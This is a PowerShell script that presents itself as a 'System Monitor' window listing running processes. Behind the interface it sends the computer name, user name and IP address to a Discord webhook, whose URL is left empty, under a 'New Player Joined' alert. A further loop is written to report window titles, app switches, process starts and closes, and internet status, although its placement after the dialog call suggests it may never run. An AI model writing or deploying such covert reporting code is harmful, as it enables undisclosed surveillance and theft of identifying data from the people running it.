Add-Type -AssemblyName System.Windows.Forms

$form = New-Object System.Windows.Forms.Form
$form.Text = "System Monitor"
$form.Size = New-Object System.Drawing.Size(800, 600)
$form.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$form.MaximizeBox = $false
$form.StartPosition = "CenterScreen"

$loadingForm = New-Object System.Windows.Forms.Form
$loadingForm.Size = New-Object System.Drawing.Size(400, 200)
$loadingForm.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
$loadingForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$loadingForm.StartPosition = "CenterScreen"

$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Text = "Loading..."
$loadingLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = [System.Drawing.Color]::White
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.Dock = "Fill"
$loadingForm.Controls.Add($loadingLabel)

$loadingForm.Show()

Start-Sleep -Seconds 3
$loadingForm.Close()

$activeListView = New-Object System.Windows.Forms.ListView
$activeListView.View = [System.Windows.Forms.View]::Details
$activeListView.FullRowSelect = $true
$activeListView.GridLines = $true
$activeListView.Size = New-Object System.Drawing.Size(780, 200)
$activeListView.Location = New-Object System.Drawing.Point(10, 10)
$activeListView.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$activeListView.ForeColor = [System.Drawing.Color]::White
$activeListView.Columns.Add("Active Applications", 760)
$activeListView.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$activeListView.Font = New-Object System.Drawing.Font("Arial", 10)

$backgroundListView = New-Object System.Windows.Forms.ListView
$backgroundListView.View = [System.Windows.Forms.View]::Details
$backgroundListView.FullRowSelect = $true
$backgroundListView.GridLines = $true
$backgroundListView.Size = New-Object System.Drawing.Size(780, 200)
$backgroundListView.Location = New-Object System.Drawing.Point(10, 220)
$backgroundListView.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$backgroundListView.ForeColor = [System.Drawing.Color]::White
$backgroundListView.Columns.Add("Background Processes", 760)
$backgroundListView.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$backgroundListView.Font = New-Object System.Drawing.Font("Arial", 10)

$form.Controls.Add($activeListView)
$form.Controls.Add($backgroundListView)

function Send-DiscordLog {
    param ([string]$title, [string]$description, [string]$color)
    $webhookURL = ""
    $json = @{
        "embeds" = @(@{
            "title" = $title
            "description" = $description
            "color" = $color
            "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    $attempt = 0
    $success = $false
    while (-not $success -and $attempt -lt 5) {
        try {
            Invoke-RestMethod -Uri $webhookURL -Method Post -Body $json -ContentType "application/json"
            $success = $true 
        }
        catch {
            if ($_ -match "rate limited") {
                $attempt++
                Write-Host "Rate limited, retrying in 1 second... (Attempt $attempt)"
                Start-Sleep -Seconds 1
            } else {
                Write-Host "Error sending message: $_"
                break
            }
        }
    }
}

function Update-ListViews {
    $activeListView.BeginUpdate()
    $backgroundListView.BeginUpdate()

    $activeListView.Items.Clear()
    $backgroundListView.Items.Clear()

    $activeProcesses = Get-Process | Select-Object ProcessName, MainWindowTitle | Where-Object { $_.MainWindowTitle -ne "" }
    $backgroundProcesses = Get-Process | Select-Object ProcessName | Where-Object { $_.MainWindowTitle -eq "" }

    foreach ($process in $activeProcesses) {
        $item = New-Object System.Windows.Forms.ListViewItem
        $item.Text = "$($process.ProcessName) ($($process.MainWindowTitle))"
        $activeListView.Items.Add($item)
    }

    foreach ($process in $backgroundProcesses) {
        $item = New-Object System.Windows.Forms.ListViewItem
        $item.Text = "$($process.ProcessName)"
        $backgroundListView.Items.Add($item)
    }

    $activeListView.EndUpdate()
    $backgroundListView.EndUpdate()
}

$ComputerName = $env:COMPUTERNAME
$IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress | Select-Object -First 1
$UserName = $env:UserName

Send-DiscordLog -title "🖥 **New Player Joined**" -description "**PC Name:** $ComputerName  
**User:** $UserName  
**IP Address:** $IPAddress  
🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "3066993"

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 5000
$timer.Add_Tick({ Update-ListViews })
$timer.Start()
$form.ShowDialog()

$previousProcesses = Get-Process | Select-Object ProcessName
$lastActiveApp = ""

try {
    while ($form.Visible) {
        $isConnected = Test-Connection -ComputerName "google.com" -Count 1 -Quiet
        if (-not $isConnected) {
            Send-DiscordLog -title "⚠️ **Internet Disconnected**" -description "**🖥 PC:** $ComputerName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  
            ❌ **Internet Connection Lost**" -color "15158332"
        } else {
            Send-DiscordLog -title "✅ **Internet Reconnected**" -description "**🖥 PC:** $ComputerName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  
            ✅ **Internet Connection Restored**" -color "3066993"
        }

        $currentProcesses = Get-Process | Select-Object ProcessName
        $newProcesses = $currentProcesses | Where-Object {$_ -notin $previousProcesses}
        $closedProcesses = $previousProcesses | Where-Object {$_ -notin $currentProcesses}

        $activeWindow = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Sort-Object StartTime -Descending | Select-Object -First 1)
        $activeApp = if ($activeWindow) { $activeWindow.ProcessName + " (" + $activeWindow.MainWindowTitle + ")" } else { "Unknown" }

        if ($activeApp -ne $lastActiveApp) {
            Send-DiscordLog -title "🔄 **Tab Switched / App Focus Changed**" -description "**New Active App:** $activeApp  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "7419530"
            $lastActiveApp = $activeApp
        }

        foreach ($proc in $newProcesses) {
            Send-DiscordLog -title "⚡ **New Process Started**" -description "**🖥 PC:** $ComputerName  
            **📂 Process:** $proc.ProcessName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "3447003"
        }

        foreach ($proc in $closedProcesses) {
            Send-DiscordLog -title "❌ **Process Closed**" -description "**🖥 PC:** $ComputerName  
            **📂 Process:** $proc.ProcessName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "15158332"
        }

        $previousProcesses = $currentProcesses

        Start-Sleep -Seconds 2
    }
} catch {
    Send-DiscordLog -title "🚨 **WARNING: Monitoring Stopped!**" -description "**🖥 PC:** $ComputerName  
    **User:** $UserName  
    🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "15105570"
}
